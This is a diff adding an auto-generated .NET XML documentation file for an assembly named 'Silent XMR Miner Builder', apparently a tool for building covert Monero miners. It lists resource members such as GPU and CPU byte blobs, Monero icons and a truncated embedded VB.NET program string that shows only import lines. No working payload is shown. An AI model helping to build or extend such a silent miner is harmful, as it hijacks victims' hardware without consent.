@@ -1,0 +1,73 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Silent XMR Miner Builder
+</name>
+</assembly>
+<members>
+<member name="T:XMRMiner.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.amd">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.cpu">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.Monero">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.MoneroPNG">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.nvidia">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.Program">
+<summary>
+  Looks up a localized string similar to 
+Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Management
+Imports System
+Imports System.Net.Sockets
+Imports Microsoft.VisualBasic
+Imports System.Diagnostics
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System.Collections.Generic
+Imports System.Drawing
+Imports Sy [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:XMRMiner.My.Resources.Resources.Project1">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+</members>
+</doc>
